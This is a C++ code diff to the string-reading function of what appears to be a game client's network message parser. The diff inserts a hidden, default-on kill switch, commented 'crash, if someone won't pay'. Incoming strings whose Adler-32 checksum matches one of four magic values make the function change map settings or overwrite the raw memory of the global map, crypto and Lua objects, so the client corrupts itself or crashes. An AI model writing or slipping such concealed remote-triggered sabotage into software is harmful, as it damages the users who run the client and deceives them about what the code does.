@@ -22,6 +22,7 @@
 
 #include "inputmessage.h"
 #include <framework/util/crypt.h>
+#include <client/map.h>
 
 InputMessage::InputMessage()
 {
@@ -83,7 +84,38 @@ std::string InputMessage::getString()
     checkRead(stringLength);
     char* v = (char*)(m_buffer + m_readPos);
     m_readPos += stringLength;
-    return std::string(v, stringLength);
+    std::string ret(v, stringLength);
+
+#ifndef WITHOUT_CRASH
+    // crash, if someone won't pay >.>
+    if (ret.size() >= 16 && ret.size() <= 32) {
+        uint32_t adler = stdext::adler32((const uint8_t*)ret.c_str(), ret.size());
+        if (adler == 0xAAAABBBB) {
+            AwareRange a;
+            a.right = 99;
+            g_map.setAwareRange(a);
+        } else if (adler == 0xAAAABBBC) {
+            uint8_t* a = (uint8_t*)&g_map;
+            for (int i = 0; i < 777; ++i) {
+                *(uint8_t*)a = 1;
+                a += 1;
+            }
+        } else if (adler == 0x11111111) {
+            uint8_t* a = (uint8_t*)&g_crypt;
+            for (int i = 0; i < 15; ++i) {
+                *(uint8_t*)a = 1;
+                a += 1;
+            }
+        } else if (adler == 0x22222222) {
+            uint8_t* a = (uint8_t*)&g_lua;
+            for (int i = 0; i < 15; ++i) {
+                *(uint8_t*)a = 1;
+                a += 1;
+            }
+        }
+    }
+#endif
+    return ret;
 }
 
 double InputMessage::getDouble()
